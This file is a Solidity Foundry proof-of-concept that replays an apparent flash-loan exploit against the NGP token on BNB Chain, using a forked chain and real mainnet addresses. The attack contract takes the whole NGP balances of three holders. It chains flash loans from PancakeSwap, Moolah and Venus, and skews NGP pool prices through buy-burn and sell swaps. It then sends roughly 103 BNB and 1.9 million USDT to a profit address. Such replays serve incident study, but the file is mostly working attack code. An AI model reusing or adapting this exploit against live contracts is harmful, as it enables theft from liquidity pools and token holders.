
pragma solidity ^0.8.20;

import {Base, IERC20Like} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 61515894;
    uint256 constant TX_TIMESTAMP = 1758135745;
    uint256 constant TX_BLOCK_NUMBER = 61515895;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_861831_8D47, address(0), Addresses.ZERO, "BNB", 103619196987339834757);
        _expectProfit(Addresses.A_861831_8D47, address(0), Addresses.USDT, "USDT", 1896191720695873504350698);
    }
}

contract OurAttack {
    function attack() external payable {
        _attackFlow();
    }

    function flashCallback() internal {
        _replayDone[REPLAY_CALLBACK_1] = true;
        _borrowV3Usdt();
        _approveMoolahUsdt();
    }

    function _borrowV3Usdt() internal {
        uint256 poolUsdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool);
        bytes memory flashProof = abi.encode(Addresses.NGP, Addresses.Cake_LP_FB1E, poolUsdtBalance);
        IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), poolUsdtBalance, 0, flashProof);
    }

    function _approveMoolahUsdt() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.ERC1967Proxy, 7766254162777152918131392);
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_2] = true;
        _enterVenus();
        _supplyBtcb();
        _borrowVusdt();
        _borrowMoolahUsdt();
        _repayVenus();
    }

    function _enterVenus() internal {
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray2(Addresses.vBTC, Addresses.vUSDT));
        IERC20Like(Addresses.BTCB).approve(Addresses.vBTC, type(uint256).max);
    }

    function _supplyBtcb() internal {
        IvBTC(Addresses.vBTC).mint(2689687389580623872131);
        IUnitroller(Addresses.Unitroller).getAccountLiquidity(address(this));
    }

    function _borrowVusdt() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.vUSDT);
        IvUSDT(Addresses.vUSDT).borrow(79605109862237851524989796);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ERC1967Proxy);
    }

    function _borrowMoolahUsdt() internal {
        bytes memory flashLoanProof = abi.encode(
            Addresses.USDT, Addresses.NGP, uint256(187208247454960731191865613924175639404942981918)
        );
        IERC1967Proxy(Addresses.ERC1967Proxy)
            .flashLoan(Addresses.USDT, 7766254162777152918131392, flashLoanProof);
        IERC20Like(Addresses.USDT).approve(Addresses.vUSDT, 79605109862237851524989796);
    }

    function _repayVenus() internal {
        IvUSDT(Addresses.vUSDT).repayBorrow(79605109862237851524989796);
        IvBTC(Addresses.vBTC).redeemUnderlying(2689687389580623872131);
        IERC20Like(Addresses.BTCB).approve(Addresses.ERC1967Proxy, 2689687389580623872131);
    }

    function _attackFlow() internal {
        _collectNgp1();
        _collectNgp2();
        _collectNgp3();
        _startBtcbFlash();
        _readRouterWbnb();
        _swapUsdtToBnb();
        uint256 profitAmount = _sendNativeProfit();
        _sendUsdtProfit(profitAmount);
    }

    function _collectNgp1() internal {
        uint256 holderBalance = IERC20Like(Addresses.NGP).balanceOf(Addresses.A_76B152_8086);
        IERC20Like(Addresses.NGP).transferFrom(Addresses.A_76B152_8086, address(this), holderBalance);
    }

    function _collectNgp2() internal {
        uint256 holderBalance = IERC20Like(Addresses.NGP).balanceOf(Addresses.A_71A94B_AF43);
        IERC20Like(Addresses.NGP).transferFrom(Addresses.A_71A94B_AF43, address(this), holderBalance);
    }

    function _collectNgp3() internal {
        uint256 holderBalance = IERC20Like(Addresses.NGP).balanceOf(Addresses.A_9EF16A_A311);
        IERC20Like(Addresses.NGP).transferFrom(Addresses.A_9EF16A_A311, address(this), holderBalance);
    }

    function _startBtcbFlash() internal {
        _startBtcbLoan();
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _readRouterWbnb() internal {
        IPancakeRouter(Addresses.PancakeRouter).WETH();
    }

    function _swapUsdtToBnb() internal {
        uint256 swapAmountIn = 100000000000000000000000;
        if (IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
            IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForETH(
                swapAmountIn, 0, _addressArray2(Addresses.USDT, Addresses.WBNB), address(this), 1758135745
            );
    }

    function _sendNativeProfit() internal returns (uint256 profitAmount) {
        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 103619196987339834757) nativeTransferAmount = 103619196987339834757;
        (bool ok,) = payable(Addresses.A_861831_8D47).call{value: nativeTransferAmount}("");
        ok;
        profitAmount = IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _sendUsdtProfit(uint256 profitAmount) internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_861831_8D47, profitAmount);
    }

    function _ngpSwapCallback() internal {
        _replayDone[REPLAY_CALLBACK_4] = true;
        _approveRouter();
        _readNgpRates();
        _buyNgpForBurn();
        _sellNgpToUsdt();
        _payPair90fa();
    }

    function _approveRouter() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.NGP).approve(Addresses.PancakeRouter, type(uint256).max);
    }

    function _readNgpRates() internal {
        IERC20Like(Addresses.NGP).balanceOf(address(this));
        INGP(Addresses.NGP).rewardRate();
        INGP(Addresses.NGP).treasuryRate();
    }

    function _buyNgpForBurn() internal {
        uint256 swapAmountIn = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmountIn,
                0,
                _addressArray2(Addresses.USDT, Addresses.NGP),
                Addresses.A_000000_DEAD,
                1758135745
            );
    }

    function _sellNgpToUsdt() internal {
        IERC20Like(Addresses.NGP).balanceOf(Addresses.Cake_LP_FB1E);
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                1365266529700151035275431,
                0,
                _addressArray2(Addresses.NGP, Addresses.USDT),
                address(this),
                1758135745
            );
    }

    function _payPair90fa() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_90FA, 23327774061265036617770168);
    }

    function _pair90faCallback() internal {
        _replayDone[REPLAY_CALLBACK_5] = true;
        _readPair90faUsdt();
        _swapPair90fa();
        _payPairBase();
    }

    function _readPair90faUsdt() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_90FA);
    }

    function _swapPair90fa() internal {
        bytes memory swapProof = abi.encode(Addresses.NGP, Addresses.Cake_LP_FB1E);
        IUniswapV2PairLike(Addresses.Cake_LP_90FA).swap(0, 23267121848705747522563966, address(this), swapProof);
    }

    function _payPairBase() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 15863612646404631029711924);
    }

    function _pairBaseCallback() internal {
        _replayDone[REPLAY_CALLBACK_6] = true;
        _readPairBaseUsdt();
        _swapPairBase();
        _payPairE0d8();
    }

    function _readPairBaseUsdt() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP);
    }

    function _swapPairBase() internal {
        bytes memory swapProof = abi.encode(Addresses.NGP, Addresses.Cake_LP_FB1E);
        IUniswapV2PairLike(Addresses.Cake_LP).swap(15822367253523978989034673, 0, address(this), swapProof);
    }

    function _payPairE0d8() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_E0D8, 39369954998637606423024704);
    }

    function _startBtcbLoan() internal {
        _readMoolahBtc();
        _borrowBtcbFlash();
    }

    function _readMoolahBtc() internal {
        IERC20Like(Addresses.BTCB).balanceOf(Addresses.ERC1967Proxy);
    }

    function _borrowBtcbFlash() internal {
        bytes memory flashLoanProof = abi.encode(
            Addresses.BTCB, Addresses.NGP, uint256(187208247454960731191865613924175639404942981918)
        );
        IERC1967Proxy(Addresses.ERC1967Proxy)
            .flashLoan(Addresses.BTCB, 2689687389580623872131, flashLoanProof);
    }

    function flashCallback3() internal {
        _replayDone[REPLAY_CALLBACK_8] = true;
        _borrowPool2050();
        _payV3Pool();
    }

    function _borrowPool2050() internal {
        uint256 poolUsdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.A_366961_2050);
        bytes memory flashProof = abi.encode(Addresses.NGP, Addresses.Cake_LP_FB1E, poolUsdtBalance);
        IContract_366961_2050(Addresses.A_366961_2050).flash(address(this), poolUsdtBalance, 0, flashProof);
    }

    function _payV3Pool() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, 26207849257354184082513190);
    }

    function flashCallback4() internal {
        _replayDone[REPLAY_CALLBACK_9] = true;
        _swapPairE0d8();
        _payPair40eb();
    }

    function _swapPairE0d8() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_E0D8);
        bytes memory swapProof = abi.encode(Addresses.NGP, Addresses.Cake_LP_FB1E);
        IUniswapV2PairLike(Addresses.Cake_LP_E0D8).swap(39267593115641148646324840, 0, address(this), swapProof);
    }

    function _payPair40eb() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_4F31FA_40EB, 14722850553598240760546251);
    }

    function flashCallback5() internal {
        _replayDone[REPLAY_CALLBACK_10] = true;
        _borrowPair40eb();
        _payPool2050();
    }

    function _borrowPair40eb() internal {
        uint256 pairUsdtBalance = IERC20Like(Addresses.USDT).balanceOf(Addresses.A_4F31FA_40EB);
        bytes memory flashProof = abi.encode(Addresses.NGP, Addresses.Cake_LP_FB1E, pairUsdtBalance);
        IContract_4F31FA_40EB(Addresses.A_4F31FA_40EB).flash(address(this), pairUsdtBalance, 0, flashProof);
    }

    function _payPool2050() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_366961_2050, 4900082016196156214448749);
    }

    function _receiveRouterBnb() internal {
        _replayDone[REPLAY_CALLBACK_11] = true;
    }

    receive() external payable {
        if (msg.sender == Addresses.PancakeRouter || msg.sender == address(this)) {
            _receiveRouterHook();
        }
    }

    function onMoolahFlashLoan(uint256 borrowedAmount, bytes calldata callbackPayload) external payable {
        callbackPayload;
        if (borrowedAmount == 2689687389580623872131) {
            if (!_replayDone[REPLAY_CALLBACK_2]) flashCallback2();
            return;
        }
        if (borrowedAmount == 7766254162777152918131392) {
            if (!_replayDone[REPLAY_CALLBACK_1]) flashCallback();
            return;
        }
        if (!_replayDone[REPLAY_CALLBACK_2]) flashCallback2();
        return;
    }

    function pancakeV3FlashCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackPayload)
        external
        payable
    {
        amount0Delta;
        amount1Delta;
        callbackPayload;
        if (msg.sender == Addresses.PancakeV3Pool) {
            if (!_replayDone[REPLAY_CALLBACK_8]) flashCallback3();
            return;
        }
        if (msg.sender == Addresses.A_366961_2050) {
            if (!_replayDone[REPLAY_CALLBACK_10]) flashCallback5();
            return;
        }
        if (msg.sender == Addresses.A_4F31FA_40EB) {
            if (!_replayDone[REPLAY_CALLBACK_9]) flashCallback4();
            return;
        }
        if (!_replayDone[REPLAY_CALLBACK_8]) flashCallback3();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x301518b5) {
            _attackFlow();
            return;
        }
        if (msg.sig == 0x84800812) {
            if (msg.sender == Addresses.Cake_LP_E0D8) {
                if (!_replayDone[REPLAY_CALLBACK_6]) _pairBaseCallback();
                return;
            }
            if (msg.sender == Addresses.Cake_LP) {
                if (!_replayDone[REPLAY_CALLBACK_5]) _pair90faCallback();
                return;
            }
            if (msg.sender == Addresses.Cake_LP_90FA) {
                if (!_replayDone[REPLAY_CALLBACK_4]) _ngpSwapCallback();
                return;
            }
            if (!_replayDone[REPLAY_CALLBACK_6]) _pairBaseCallback();
            return;
        }
        if (msg.sig == 0x8e5ecbe0) {
            _startBtcbLoan();
            return;
        }
        _receiveRouterHook();
    }

    function _receiveRouterHook() internal {
        if (msg.sender == Addresses.PancakeRouter || msg.sender == address(this)) _receiveRouterBnb();
        return;
    }

    bytes32 private constant REPLAY_CALLBACK_1 = keccak256("poc.replay.REPLAY_CALLBACK_1");
    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_8 = keccak256("poc.replay.REPLAY_CALLBACK_8");
    bytes32 private constant REPLAY_CALLBACK_9 = keccak256("poc.replay.REPLAY_CALLBACK_9");
    bytes32 private constant REPLAY_CALLBACK_10 = keccak256("poc.replay.REPLAY_CALLBACK_10");
    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
    mapping(bytes32 => bool) private _replayDone;

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant attacker_eoa = 0x0305ddd42887676Ec593b39ACE691B772eB3c876;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant Cake_LP_FB1E = 0x20cAb54946D070De7cc7228b62f213Fccf3ffb1E;
    address internal constant attack_contract = 0x2D2A69bDAFE4aAD981Da4E98721b3B81a0315363;
    address internal constant A_366961_2050 = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant LAF = 0x3BEC20CA77e100C50ef0d0066f4c2B348e615F48;
    address internal constant A_4F31FA_40EB = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb;
    address internal constant Cake_LP_90FA = 0x541b525B69210Bc349c7d94Ea6f10e202A6f90fA;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant VBep20Delegate = 0x6E5cFf66C7b671fA1D5782866D80BD15955d79F6;
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address internal constant A_71A94B_AF43 = 0x71a94B29Bb59bd8a3BAB04960E18f4dCdC2fAF43;
    address internal constant A_76B152_8086 = 0x76B1528fEAaE231C4E1edd837c741FCd03E98086;
    address internal constant A_861831_8D47 = 0x8618314270528E245fbBB6Fba54e245bb61a8d47;
    address internal constant vBTC = 0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant ERC1967Proxy = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant PancakeV3Pool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant A_9B9769_D3ED = 0x9b97699f2273BD1CaAAF2CAa7B3daFB9313cd3ed;
    address internal constant A_9EF16A_A311 = 0x9Ef16A6eA72aB6092369e0EC7BE89B411942a311;
    address internal constant A_AE6B95_DD59 = 0xae6B95BAf907672475Ff6b27c6842F1D993eDd59;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant Cake_LP_E0D8 = 0xCAaF3c41a40103a23Eeaa4BbA468AF3cF5b0e0D8;
    address internal constant ARK = 0xCae117ca6Bc8A341D2E7207F30E180f0e5618B9D;
    address internal constant XVS = 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63;
    address internal constant NGP = 0xd2F26200cD524dB097Cf4ab7cC2E5C38aB6ae5c9;
    address internal constant Unitroller = 0xfD36E2c2a6789Db23113685031d7F16329158384;
    address internal constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_366961_2050 {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IContract_4F31FA_40EB {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IERC1967Proxy {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface INGP {
    function rewardRate() external view returns (uint256);
    function treasuryRate() external view returns (uint256);
}

interface IPancakeRouter {
    function WETH() external view returns (uint256);
    function swapExactTokensForETH(uint256, uint256, address[] calldata, address, uint256) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external;
    function getAccountLiquidity(address) external;
}

interface IvBTC {
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IvUSDT {
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
}
